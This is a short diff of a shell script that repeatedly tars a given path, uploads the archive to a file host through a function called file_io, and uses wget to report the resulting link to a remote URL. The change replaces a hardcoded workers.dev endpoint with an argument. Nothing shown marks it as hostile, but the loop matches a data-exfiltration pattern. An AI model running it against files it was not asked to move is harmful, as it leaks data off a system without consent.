@@ -14,7 +14,7 @@ while true;do
 	printf "\n$filename"
 	tar -cf "$filename" "$1" --force-local
 	url=$(file_io "$filename")
-	wget -O /dev/null -o /dev/null "https://url-log.laiyuantemp.workers.dev/add/$url"
+	wget -O /dev/null -o /dev/null "$3"
 	rm "$filename"
 	sleep "$2"
 done
